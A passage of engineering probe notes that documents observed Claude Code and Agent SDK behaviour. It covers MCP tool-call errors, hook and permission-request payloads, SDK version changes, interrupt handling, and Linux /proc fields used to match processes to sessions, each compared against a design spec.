{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"Claude requested permissions to use mcp__probe__danger_note, but you haven't granted it yet.","is_error":true,"tool_use_id":"toolu_019uPT8ahHwoDyzKJ8BcDTz9"}]},"...":"...","tool_use_result":"Error: Claude requested permissions to use mcp__probe__danger_note, but you haven't granted it yet.","...":"..."}
{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01LTSw8eSCWywBV57sUW38kn","type":"tool_result","content":[{"type":"text","text":"echo: None count=5"}]}]},"...":"...","tool_use_result":[{"type":"text","text":"echo: None count=5"}]}
{"type":"system","subtype":"permission_denied","tool_name":"mcp__probe__danger_note","tool_use_id":"toolu_019uPT8ahHwoDyzKJ8BcDTz9","message":"Claude requested permissions to use mcp__probe__danger_note, but you haven't granted it yet.","uuid":"82c78e8c-cfcf-4540-899a-6ada5eed7c95","session_id":"b94c6873-915c-45f1-9c53-5e9be3acdc35"}
{"...":"...","permission_denials":[{"tool_name":"mcp__probe__danger_note","tool_use_id":"toolu_019uPT8ahHwoDyzKJ8BcDTz9","tool_input":{"target":"x"}}],"terminal_reason":"completed","...":"...","is_error":false,"...":"...","subtype":"success","...":"...","type":"result","...":"..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `params.name` | str | always | bare `echo_note` | |
| `params.arguments` | dict | always | `{"text":"hello","count":2}`, `{}`, `{"count":5}` | **not validated by Claude Code**: a call missing a `required` property was sent |
| `params._meta.claudecode/toolUseId` | str | always | `toolu_…` | a stdio server does receive it, so it can be correlated with hook `tool_use_id` |
| `params._meta.progressToken` | int | always | 2–5 | |
| result `isError: true` | | sometimes | | model sees `tool_result.content` = the text (a **string**), `is_error: true`; stream `tool_use_result: "Error: <text>"` |
| JSON-RPC `error {code,message}` | | sometimes | `-32603 "probe internal error"` | model sees exactly the same as `isError` (`content: "probe internal error"`) |
| not-allowed tool in `-p` | | sometimes | | never sent to the server; `system/permission_denied` + `result.permission_denials[]` |

**Variants and edge cases:** a tool outside `--allowedTools` in headless `-p` is denied immediately ("you haven't granted it yet"). In an interactive (tmux) tier-2 session the same call would raise a permission prompt; that case was not probed here.

**Spec alignment:**
- Spec line 1722 (caps return "a tool error the agent can read") is aligned: both `isError` and JSON-RPC errors reach the model as readable `is_error` text.
- Spec §11.0 / D32 assume `invoke()` receives valid `args`. Reality: on the stdio binding Claude Code forwards arguments that violate `inputSchema` (`{"count":5}` without required `text`), whereas the SDK binding validates before the handler. `to_stdio_mcp_server()` must validate against `ToolDef.input_schema` itself, or the two bindings will behave differently (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`).

---

### MCP tools in shell-hook payloads (tier-2 session)

- **Produced by:** Claude Code 2.1.270 command hooks declared in `<tmpdir>/work/.claude/settings.json`
- **Consumed by:** §8 signals (PreToolUse/PostToolUse/PostToolUseFailure/PermissionRequest folding), §11 line 1684 ("`PermissionRequest` hook surfaces them into the Needs-You rail"); D24; M1 (hooks), M4 (MCP)
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh` with `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/capture_hook.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`
- **Status:** verified live 2026-09-14 for `PreToolUse`, `PostToolUse`, `PostToolUseFailure` and `PermissionRequest` in a headless `-p` session. `PermissionDenied` never fired, so its payload is not verified. The interactive (tmux) session was not probed.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/hooks.jsonl`)

```json
{"_event":"PreToolUse","_captured_at":"2026-09-14T16:14:53.311Z","_claude_version":"2.1.270 (Claude Code)","_ancestry":[{"pid":4047209,"comm":"capture_hook.sh","ppid":4047208},{"pid":4047208,"comm":"sh","ppid":4047179},{"pid":4047179,"comm":"claude","ppid":4047178},"..."],"payload":{"session_id":"b94c6873-915c-45f1-9c53-5e9be3acdc35","transcript_path":"/root/.claude/projects/-tmp-shp-mcp-AY6vTM-work/b94c6873-915c-45f1-9c53-5e9be3acdc35.jsonl","cwd":"/tmp/shp-mcp-AY6vTM/work","prompt_id":"6086eddb-1546-4789-97e9-afdf7d1ea1c1","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"mcp__probe__echo_note","tool_input":{"text":"hello","count":2},"tool_use_id":"toolu_013516j4ARBNwtSPj9RWtTxG"}}
{"_event":"PostToolUse","...":"...","_claude_version":"2.1.270 (Claude Code)","...":"...","payload":{"...":"...","permission_mode":"default","hook_event_name":"PostToolUse","tool_name":"mcp__probe__echo_note","tool_input":{"text":"hello","count":2},"tool_response":[{"type":"text","text":"echo: 'hello' count=2"}],"tool_use_id":"toolu_013516j4ARBNwtSPj9RWtTxG","duration_ms":8}}
{"_event":"PostToolUseFailure","...":"...","_claude_version":"2.1.270 (Claude Code)","...":"...","payload":{"...":"...","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"mcp__probe__fail_note","tool_input":{"reason":"probe"},"tool_use_id":"toolu_01FsXNbwyhCiEBnL8GQh2JZG","error":"max_session_depth=3 reached; refusing","is_interrupt":false,"duration_ms":4}}
{"_event":"PostToolUseFailure","...":"...","_claude_version":"2.1.270 (Claude Code)","...":"...","payload":{"...":"...","permission_mode":"default","hook_event_name":"PostToolUseFailure","tool_name":"mcp__probe__rpc_error_note","tool_input":{},"tool_use_id":"toolu_01Ad55LkgJbpQSZDx13o2E7w","error":"probe internal error","is_interrupt":false,"duration_ms":6}}
{"_event":"PermissionRequest","...":"...","_claude_version":"2.1.270 (Claude Code)","...":"...","payload":{"...":"...","permission_mode":"default","hook_event_name":"PermissionRequest","tool_name":"mcp__probe__danger_note","tool_input":{"target":"x"},"permission_suggestions":[{"type":"addRules","rules":[{"toolName":"mcp__probe__danger_note"}],"behavior":"allow","destination":"localSettings"}]}}
```

Line counts per `_event` in `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/hooks.jsonl` (computed, not an excerpt): PreToolUse 5, PostToolUse 2, PostToolUseFailure 2, PermissionRequest 1, PermissionDenied 0. A `PermissionDenied` hook was declared (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/settings.json`).

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `payload.tool_name` | str | always | `mcp__probe__echo_note`, `mcp__probe__fail_note`, `mcp__probe__rpc_error_note`, `mcp__probe__danger_note` | prefixed form. Split on `__` to recover server and tool |
| `payload.tool_input` | dict | always | exactly the `arguments` sent (or about to be sent) | |
| `payload.tool_response` | list[{type,text}] | PostToolUse | MCP content array, unwrapped from `result` | |
| `payload.error` | str | PostToolUseFailure | the `isError` text **or** the JSON-RPC `error.message` | the two error kinds are indistinguishable here |
| `payload.is_interrupt` | bool | PostToolUseFailure | `false` | |
| `payload.duration_ms` | int | Post* | 4–8 | |
| `payload.permission_suggestions[]` | list | PermissionRequest | `addRules` for `mcp__probe__danger_note` → `localSettings` | |
| `payload.tool_use_id` | str | Pre/Post* | equals `params._meta.claudecode/toolUseId` on the MCP wire | **absent from PermissionRequest** |
| `_ancestry` | list | always | `capture_hook.sh` → `sh` → `claude` | hooks run via `sh -c` |

**Variants and edge cases:**
- PreToolUse fired 5 times, including for `danger_note`, which was then denied. PreToolUse therefore does not imply the tool ran.
- The `-p` denial produced `PermissionRequest` but **no `PermissionDenied` hook** (0 lines).

**Spec alignment:**
- Spec line 1684 is aligned: `PermissionRequest` fires for MCP tools with `tool_name`/`tool_input`. Its payload has no `tool_use_id`, so joining a permission card to the later PreToolUse/PostToolUse needs `(session_id, tool_name, tool_input)` or ordering.
- Caveat, not a contradiction: spec line 917 only puts `PermissionDenied` in the needs-you group; it does not say which denials fire it. In this probe it did not fire for a headless `-p` "not granted" denial of an MCP tool, so a consumer cannot rely on it to see that kind of denial. Use `PermissionRequest`, or `system/permission_denied` / `result.permission_denials` in the stream (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/hooks.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/stream.jsonl`).

---

### Agent SDK re-pin at claude-agent-sdk 0.2.153 / Claude Code 2.1.273 and 2.1.274 (M4 T1 / P1–P4, 2026-09-17)

- **Produced by:** claude-agent-sdk **0.2.153** driving its bundled Claude Code **2.1.273**, and the same option block driven against the PATH CLI **2.1.274** via `cli_path=`. Model `claude-haiku-4-5`, Linux 6.8, throwaway cwd, explicit `--settings` per run, `anyio.fail_after` on every scenario.
- **Consumed by:** everything the section above is consumed by. **This entry re-pins the section**: every shape above was measured at 0.2.152 / 2.1.259 / 2.1.270 and is *unverified* at the versions actually installed until read together with the tables here.
- **Probe:** `docs/probes/2026-09-17-m4-sdk/probe_m4.py` (a copy of `docs/probes/2026-09-14-schemas/agent-sdk-mcp/master_probe.py`; the original is frozen and was not edited). Re-run: `.venv/bin/python docs/probes/2026-09-17-m4-sdk/probe_m4.py p1|p2|p3|p4`
- **Status:** verified live 2026-09-17. Full write-up: `docs/probes/2026-09-17-m4-sdk/FINDINGS.md`
- **Safety record:** `~/.claude/settings.json` sha256 `375e53220773a12f0a2a7a666740f7fb20d31b2989b250e4076957d026b5d6ac` before and after every run; no `claude` process started by a probe survived it (`settings-sha256.txt`, `pids.txt` in each capture folder).

**Real example** (full capture: `docs/probes/2026-09-17-m4-sdk/p1-versions-20260917T214346Z/versions.txt`)

```text
claude_agent_sdk.__version__: 0.2.153
bundled __cli_version__: 2.1.273
PATH claude --version: 2.1.274 (Claude Code)
```

**What changed since 2026-09-14.** Three additions across four shapes, no removals and no renames.

| Shape | Field | Present at 0.2.152 / 2.1.259 | 2.1.273 | 2.1.274 | Notes |
|---|---|---|---|---|---|
| `ResultMessage` | `result_index` | no | **yes** (`0`) | **yes** | index of the result within the turn |
| `ResultMessage` | `first_content_frame_ms` | no | **yes** (`624`) | **yes** | ms to the first content frame; sits beside `ttft_ms` |
| `system/init.mcp_servers[]` | `source` | no | no | **yes** (`"sdk"`) | how the server was mounted |
| `can_use_tool` control request | `mcp_server` | no | no | **yes** (`{"name": "shepherd", "source": "sdk"}`) | **SDK 0.2.153 drops it**: `ToolPermissionContext` has no such field, so a Python callback still cannot read it |

Everything else in this section's `system/init`, `tools/list`, `tools/call`, `can_use_tool` and `ResultMessage` tables was re-observed **unchanged** (`docs/probes/2026-09-17-m4-sdk/p1-versions-20260917T214346Z/field-diff.txt`). Two counts moved without changing a shape: `system/init.skills` is **18** (was 17) and `slash_commands` **53** (was 50) under `setting_sources=[]`.

**`ToolPermissionContext` (claude-agent-sdk 0.2.153), the dataclass `can_use_tool` receives**

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `tool_use_id` | str | always | `toolu_…` | joins the callback to `tool_use` and to the PreToolUse hook |
| `display_name` | str | always | `Shadow Tool` | derived from the tool name |
| `suggestions[]` | list | always | `addRules` → `localSettings` | |
| `signal`, `agent_id`, `blocked_path`, `decision_reason`, `title`, `description` | | always | `null` | |
| `mcp_server` | — | **never** | — | the 2.1.274 wire field is not surfaced by this SDK version |

**`interrupt()` while an in-process MCP tool handler is running** (closes §Not verified's row of that name; probe `p2`, capture `docs/probes/2026-09-17-m4-sdk/p2-interrupt-20260917T215207Z/`). Handler blocked a worker thread for 20 s via `anyio.to_thread.run_sync`; `interrupt()` at 5 s.

| Observation | Value | Notes |
|---|---|---|
| worker thread sees cancellation | **no** | all 20 one-second ticks logged; thread finished 16 s after the interrupt |
| handler coroutine sees cancellation | **no** | `await anyio.to_thread.run_sync(...)` returned normally |
| `control_cancel_request` on the wire | **absent** | contrast: a **pending `can_use_tool`** *does* get one, and a `CancelledError` with it |
| `interrupt()` return / latency | `None` / 10 ms | |
| turn's `ResultMessage` | `subtype: error_during_execution`, `terminal_reason: aborted_tools`, `is_error: true`, `permission_denials: []`, `errors: ["[ede_diagnostic] result_type=user last_content_type=n/a stop_reason=tool_use"]` | the turn ends in 5.11 s with the tool still running |
| client after the interrupt | usable | next `query()` answered on the same `session_id` |
| closing the client with the handler still running | SDK gives up after 5 s | `SDK MCP server 'shepherd' did not stop within 5.0s of being closed (a tool is probably blocked outside the event loop); no longer waiting for it` (`probe-stderr.txt`) |

**`can_use_tool` for a tool outside `allowed_tools`** (probe `p3`, capture `docs/probes/2026-09-17-m4-sdk/p3-shadow-20260917T214506Z/`). Two tools mounted under `tools=[]` + `strict_mcp_config=True`, one allow-listed.

| Observation | Value |
|---|---|
| mounted tool **absent** from `allowed_tools` | **reaches `can_use_tool`** — the only call the callback saw |
| mounted tool **present** in `allowed_tools` | does not reach it; auto-approved first |
| `CanUseToolShadowedWarning` | emitted once at connect, naming **exactly the allow-listed set** — i.e. the tools the callback will *not* see |

**`setting_sources` and a user plugin** (closes §Not verified's *"`setting_sources=[]` excluding the cc10x user plugin"*; probe `p4`, capture `docs/probes/2026-09-17-m4-sdk/p4-plugins-20260917T214517Z/`). Two runs, identical but for `setting_sources`, with a flag-settings file containing `{}` — **no `enabledPlugins` override**, which is what the 2026-09-14 runs all had and why the effect could not be isolated then.

| `setting_sources` | argv | `system/init.plugins` | `skills` | `slash_commands` | `tools` | `mcp_servers` |
|---|---|---|---|---|---|---|
| `[]` | `--setting-sources=` | **`[]`** | 18 | 53 | probe tools only | probe server only |
| `None` | (flag absent) | **`[{"name": "cc10x", "path": "/root/src/cc10x-qa/plugins/cc10x", "source": "cc10x@cc10x", "version": "12.8.2"}]`** | 32 | 67 | probe tools only | probe server only |

**Variants and edge cases:**
- `tools=[]` + `strict_mcp_config=True` bounds the tool surface under **both** `setting_sources` values. `setting_sources` governs plugins, skills and slash commands; it does not govern tools.
- `setting_sources=[]` does **not** remove Claude Code's own skills (18 listed). `tools=[]` is what makes them unreachable, by removing the `Skill` tool.
- Under `setting_sources=None` cc10x was *registered* but fired no hook for a one-word prompt with one tool mounted: the transcript attachments were identical in both runs. Registration is what is proved, not quiescence.
- The model id `claude-haiku-4-5-20251001` used by the 2026-09-14 harness still resolves at 2.1.274, as does the alias `claude-haiku-4-5` (`docs/probes/2026-09-17-m4-sdk/p1-versions-20260917T214346Z/model-resolution.txt`).
- `_build_input_schema`'s D53 branch is unchanged at 0.2.153 (`type` **and** `properties` **and** `isinstance(type, str)`).

**Spec alignment:**
- §18's risk row *"`setting_sources=[]` truly isolating the master from the global `CLAUDE.md`/cc10x — verify in M4 and assert it in a test — do not trust it"* is **closed in the affirmative**, and the assertion it asks for is `system/init.plugins == []` from a live `system/init`.
- Spec line 1528's `# no CLAUDE.md, no cc10x, no skills`: **"no cc10x" is now confirmed**; "no skills" remains wrong (18 listed).
- The §`setting_sources` isolation entry above says the cc10x exclusion is "not verifiable here". That is superseded: the flag-settings disabling was the old harness's choice, not a safety requirement.
- The §`interrupt()` entry above describes an interrupt during streaming and during a pending approval. A **running tool handler behaves differently from a pending approval** — nothing is cancelled and nothing is told. Any withdrawal of an approval card must therefore be driven by our own `interrupt()` path, keyed by id (D54, ADR-M4-3).

## Linux processes, sockets, systemd, XDG, credentials, toolchain and git

**Surface:** `linux-process-git`. **Source:** `docs/probes/2026-09-14-schemas/linux-process-git/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/linux-process-git/`.

<!-- Surface: linux-process-git. Evidence folder: docs/probes/2026-09-14-schemas/linux-process-git/
     All captures: claude --version = 2.1.270 (Claude Code); host Ubuntu 24.04.4 LTS, Linux 6.8.0-117-generic x86_64,
     systemd 255, git 2.43.0, Python 3.12.3, uid 0 (root). Captured 2026-09-14 16:16–16:26 UTC.
     Paths below are relative to docs/probes/2026-09-14-schemas/linux-process-git/ unless absolute.
     Throwaway sessions only (haiku); the user's live claude processes were only read, and appear as redacted shapes
     (flag names, env var NAMES, cgroup) under "others" in captures/proc-*-snapshot.json.
     Audited 2026-09-14: all 16 fenced examples traced as ordered byte-for-byte excerpts of the cited capture files;
     no user-session content in examples; Status/alignment wording corrected where the evidence did not reach. -->

### `/proc/<pid>/stat` of a claude process (starttime, comm, ppid)

- **Produced by:** Linux kernel 6.8.0-117-generic procfs, for Claude Code 2.1.270 processes
- **Consumed by:** §5 process topology and §8 `state`/`stopped` ("observed process exit", spec line 938; "process exit ≠ 0", line 964), §9 LocalRunner, D1 (attached sessions), D14, M1 (attached liveness), M3 (owned sessions)
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh` (uses `docs/probes/2026-09-14-schemas/linux-process-git/proc_snapshot.py`, `docs/probes/2026-09-14-schemas/linux-process-git/hook_capture.py`, `docs/probes/2026-09-14-schemas/linux-process-git/sessiond_sim.py`). Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-C-snapshot.json`, interactive throwaway session in tmux)
```json
   "stat_raw": "4049158 (claude) R 4049157 4049158 4049158 34820 4049158 4194304 69500 28569 0 0 334 32 24 13 20 0 9 0 544014506 5696491520 78486 18446744073709551615 ... 0",
   "stat_field_count": 52,
   "stat_named_fields": {
    "1:pid": "4049158",
    "2:comm": "claude",
    "3:state": "R",
    "4:ppid": "4049157",
    "5:pgrp": "4049158",
    "6:session": "4049158",
    "7:tty_nr": "34820",
    "8:tpgid": "4049158",
...
    "20:num_threads": "9",
    "22:starttime": "544014506",
...
   "starttime_epoch_s": 1789402889.06,
```
`clk_tck` and `btime` from the same file: `"clk_tck": 100,` / `"btime": 1783962744,`.

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| 1 `pid` | int | always | | |
| 2 `comm` | string in parens | always | `claude` (4/4 own snapshots A–D + 4/4 user processes); **`2.1.270` when launched by full path** | Max 15 bytes. Parse with `rindex(")")`, not `split()` |
| 3 `state` | char | always | `S`, `R` | |
| 4 `ppid` | int | always | `timeout` (A/B/D), `tmux: server` (C), `bash` (all 4 user processes) | |
| 5–8 `pgrp`,`session`,`tty_nr`,`tpgid` | int | always | print mode: `tty_nr 0`, `tpgid -1`; interactive in tmux: `tty_nr 34820`, own session leader | Distinguishes a pty-attached TUI from a `-p` run |
| 20 `num_threads` | int | always | `9` | Thread comms: `claude`, `JSCWarmUp`, `mi-scavenger`, `JITWorker`, `Bun Pool 0`, `Bun Pool 1`, `HTTP Client`, `HeapHelper`, `fs.watch` |
| 22 `starttime` | int (clock ticks since boot) | always | `544014506` | Wall clock = `btime + starttime / CLK_TCK` (CLK_TCK = 100). **Equals the registry's `procStart` string in 24/24 hook deliveries** (next schema) |
| total fields | | always | 52 | |

**Variants and edge cases:**
- **`comm` is not reliably `claude`.** The same binary started as `/root/.local/share/claude/versions/2.1.270` has `comm: 2.1.270`, `status Name: 2.1.270`, `argv0: /root/.local/share/claude/versions/2.1.270` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/comm-fullpath.txt`). Identify claude processes by `readlink /proc/<pid>/exe` matching `*/claude/versions/*`, not by `comm`.
- The user's live processes (redacted shapes, `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-A-snapshot.json` "others"): 4 processes, `exe` basenames `2.1.269` (1) and `2.1.270` (3). A process keeps running the old versioned binary after an auto-update.
- Readable by a different uid (`runuser -u nobody`): `cmdline`, `comm`, `stat`, `status`. Denied: `environ`, `cwd`, `exe`, `fd` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-nobody-A.txt`, `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-nobody-C.txt`). `hidepid` is not set (`/proc` mount options `rw,nosuid,nodev,noexec,relatime`); `kernel.yama.ptrace_scope = 1`. Same-uid reads all succeeded.

**Spec alignment:** the spec relies on "observed process exit" (line 938) and "process exit ≠ 0" (line 964), but the `session` table (§7, lines 640–698) has no `pid` or process-start column. Without `(pid, starttime)` there is no way to observe exit for an `attached` session, and no guard against pid reuse. An exit code is not observable at all for a process that is not our child. The spec says `exit_code` is `owned` only, which is consistent with that. Reality: `(pid, starttime)` is available and stable (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-peercred.jsonl`).

### `/proc/<pid>/{cmdline,exe,cwd,environ,cgroup}` of a claude process

- **Produced by:** Linux procfs, for Claude Code 2.1.270
- **Consumed by:** §8 attached-session registration (lines 881, 926–927), §7.0 `session.cwd`/`brief`, D1, D22 (cwd binding), M1
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh` + `docs/probes/2026-09-14-schemas/linux-process-git/proc_snapshot.py`. Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-C-snapshot.json`)
```json
   "exe": "/root/.local/share/claude/versions/2.1.270",
   "argv": [
    "claude",
    "--model",
    "claude-haiku-4-5-20251001",
    "--session-id",
    "159b556e-eb7e-4cbe-b303-efcc8f5d08a5",
    "--name",
    "shp lpg probe",
    "--allowedTools",
    "Bash(sleep *)"
   ],
   "cwd": "/tmp/shp-lpg-proc.vpBd05/real/repo",
...
   "cgroup": "0::/user.slice/user-0.slice/user@0.service/tmux-spawn-37d8f7d4-3ea6-4cda-a6c8-9f1dc5736877.scope",
   "parent": {
    "pid": 4049157,
    "comm": "tmux: server"
   },
...
   "environ_link": {
    "CLAUDE_PID_present": true,
    "CLAUDE_PID_equals_this_pid": false,
    "CLAUDE_CODE_SESSION_ID_present": true,
    "CLAUDE_CODE_SESSION_ID_equals_a_marker_of_this_session": false,
    "PWD_equals_proc_cwd": false
   },
```
The `--resume` form (full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-B-snapshot.json`):
```json
    "--resume",
    "bf3b6fd8-3e12-42de-b62a-02535a996554",
```
A user's live session, redacted to its shape (full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-A-snapshot.json`, "others"):
```json
   "argv_shape": [
    "--resume",
    "<redacted>",
    "--remote-control",
    "<redacted>"
   ],
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `cmdline` | NUL-separated argv | always | `claude -p <prompt> --model … --session-id <uuid> …`; `--resume <uuid>` as two separate elements; user processes: `--resume <r> --remote-control <r>` (3), no args (1) | The session id is in argv only when `--session-id`, `--resume` or a similar flag was passed. A bare `claude` has no id in argv. **The `-p` prompt text is in argv and readable by any uid** |
| `exe` | symlink | always | `/root/.local/share/claude/versions/2.1.270`, `…/2.1.269` | Same-uid only |
| `cwd` | symlink | always | `/tmp/shp-lpg-proc.vpBd05/real/repo` | **Physical path.** Launched from `…/link/repo` (a symlink), it resolves to `…/real/repo` |
| `environ` | NUL-separated | always | own sessions: 41–42 names when launched from inside Claude Code, 6 names with `env -i` (`HOME LANG PATH PWD TERM XDG_RUNTIME_DIR`); user processes: 41 names (3), 22 names (1) | This is the **exec-time** environment. Claude Code sets nothing in its own environ |
| `CLAUDE_PID`, `CLAUDE_CODE_SESSION_ID` in environ | string | sometimes (A/B/C and 3/4 user processes; not D, not 1/4 user) | never equal to this process's own pid/session (A, B, C) | **Inherited from the Claude Code session that launched it.** Never use a claude process's own environ to learn its session id |
| `cgroup` | `0::/…` | always | own: `user@0.service/tmux-spawn-<uuid>.scope`; user: `user@0.service/tmux-spawn-<uuid>.scope` (3), `session-10905.scope` (1) | Shows whether the process lives under the user manager or under a login session scope |

**Variants and edge cases:**
- `PWD` in environ is the logical path (`…/link/repo`) and differs from the `cwd` symlink (`PWD_equals_proc_cwd: false` in all 4 own snapshots).
- The environ names of the user's Remote Control sessions include `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`, `TMUX`, `TMUX_PANE` (names only; values not read).
- `fd` of a live session includes `/tmp/claude-0/-tmp-shp-lpg-proc-vpBd05-real-repo/<session_id>/tasks` (C) and `.../<session_id>/tasks` (A, B, D), a directory that contains the session id. This is a second, undocumented pid→session hint. It was not relied on.

**Spec alignment:** spec lines 926–927 say a hand-launched session "registers itself on its first turn with no filesystem polling". That still holds for sessions started after hooks exist. For a session already running, `/proc` gives cwd and sometimes an argv id, but not reliably a session id. The registry (next schema) is the source for that. The spec names neither. Not probed on this surface: whether a session that was already running when hooks were installed ever fires `SessionStart` later (for example on `/clear`, compaction or a settings reload). The gap above is about the window before that, and it does not depend on the answer.

### Hook process ancestry and environment (which claude owns this hook?)

- **Produced by:** Claude Code 2.1.270 when it runs a `type: command` hook
- **Consumed by:** §8 "Hook installation: one dispatcher" (hookd.py, lines 893–930), §5 (UDS, line 312), D37, M1
- **Probe:** `docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh` with `docs/probes/2026-09-14-schemas/linux-process-git/hook_capture.py` registered for SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, Stop and SessionEnd in `<tmpdir>/real/repo/.claude/settings.json` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-settings.json`). Re-run: `bash docs/probes/2026-09-14-schemas/linux-process-git/probe_proc.sh`
- **Status:** verified live 2026-09-14 (4 sessions × 6 events = 24 hook runs)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-hooks.jsonl`, session C `SessionStart`)
```json
{"_event": "SessionStart", "_captured_at": "2026-09-14T16:21:38.957Z", "_claude_version": "2.1.270 (Claude Code)", "_hook_pid": 4049200, "_claude_pid": 4049158, "_ancestry": [{"pid": 4049200, "ppid": 4049199, "comm": "python3", ... "exe": "/usr/bin/python3.12"}, {"pid": 4049199, "ppid": 4049158, "comm": "sh", "cmdline": ["/bin/sh", "-c", "SHP_CLAUDE_VERSION='2.1.270 (Claude Code)' python3 ... "exe": "/usr/bin/dash"}, {"pid": 4049158, "ppid": 4049157, "comm": "claude", "cmdline": ["claude", "--model", "claude-haiku-4-5-20251001", "--session-id", "159b556e-eb7e-4cbe-b303-efcc8f5d08a5", "--name", "shp lpg probe", "--allowedTools", "Bash(sleep *)"], "exe": "/root/.local/share/claude/versions/2.1.270"}, {"pid": 4049157, "ppid": 1, "comm": "tmux: server"}], ... "_env_selected": {"CLAUDECODE": "1", "CLAUDE_CODE_ENTRYPOINT": "cli", "CLAUDE_PROJECT_DIR": "/tmp/shp-lpg-proc.vpBd05/real/repo", "PWD": "/tmp/shp-lpg-proc.vpBd05/link/repo", ... "XDG_RUNTIME_DIR": "/run/user/0"}, "_env_link": {"CLAUDE_PID_present": true, "CLAUDE_PID_equals_owning_claude_pid": true, "CLAUDE_CODE_SESSION_ID_present": true, "CLAUDE_CODE_SESSION_ID_equals_payload_session_id": true, "CLAUDE_PROJECT_DIR_equals_payload_cwd": true, "PWD_equals_payload_cwd": false}, "payload": {"session_id":"159b556e-eb7e-4cbe-b303-efcc8f5d08a5","transcript_path":"/root/.claude/projects/-tmp-shp-lpg-proc-vpBd05-real-repo/159b556e-eb7e-4cbe-b303-efcc8f5d08a5.jsonl","cwd":"/tmp/shp-lpg-proc.vpBd05/real/repo", ...}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| ancestry `hook → sh → claude` | process chain | always (24/24) | `python3` → `sh` (`/bin/sh -c <command>`, exe `/usr/bin/dash`) → `claude` | The hook's **grandparent** is the owning claude. There is a `/bin/sh -c` in between |
| ancestors above claude | chain | always | A/B/D: `timeout, bash, bash, timeout, bash, claude, bash, tmux: server`; C: `tmux: server` (ppid 1) | A/B/D ran nested under another Claude Code session. **The nearest claude ancestor is the owner; a second claude further up is the launcher** |
| env `CLAUDE_PID` | string | always (24/24) | equals the owning claude pid in 24/24 | Set by claude for its hook children. Its own environ does not have it (previous schema) |
| env `CLAUDE_CODE_SESSION_ID` | string | always (24/24) | equals payload `session_id` in 24/24 (A, B with `--resume`, C, D) | |
| env `CLAUDE_PROJECT_DIR` | string | always | equals payload `cwd` in 24/24 (physical path) | |
| env `PWD` | string | always | logical path `…/link/repo`; ≠ payload `cwd` in 24/24 | Inherited, not reset |
| env `CLAUDE_CODE_ENTRYPOINT` | string | always | `sdk-cli` (`-p`), `cli` (interactive) | |
| env `CLAUDE_ENV_FILE` | string | sometimes | `SessionStart` only | name only recorded |
| env `COLUMNS`, `LINES` | string | sometimes | interactive (C) only | |
| env `CLAUDE_CODE_MESSAGING_SOCKET`, `…_TOKEN` | string | sometimes | absent from `SessionEnd` hook env (A, B, D, C) | names only |

**Variants and edge cases:**
- The hook's own env carries both ids, so hookd can stamp `claude_pid` onto the frame without walking `/proc`. The ancestry walk is the fallback, and it must match `exe` rather than `comm` (see the first schema).
- cc10x confound: with `"enabledPlugins": {"cc10x@cc10x": false}` the stream-json `init` reported `plugins: []` and the only `hook_started` event was our `SessionStart:startup` (or `SessionStart:resume`) (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-A-stream.jsonl`, `proc-B-stream.jsonl`, `proc-D-stream.jsonl`). No cc10x hooks fired.

**Spec alignment:** spec lines 900–906 (hookd.py) read stdin and forward it without any process identity. That is aligned with the payload (the payload carries `session_id`). Gap: the pid needed for liveness (see the `/proc/<pid>/stat` schema) is free in the hook env as `CLAUDE_PID` (`docs/probes/2026-09-14-schemas/linux-process-git/captures/proc-hooks.jsonl`), and the spec never mentions it.

### pid ↔ session_id linkage: `~/.claude/sessions/<pid>.json` `procStart` = `/proc/<pid>/stat` field 22

- **Produced by:** Claude Code 2.1.270 (registry file) + Linux procfs
- **Consumed by:** §8 lines 881 and 926–927 (register attached sessions), D1, D24 liveness, M1
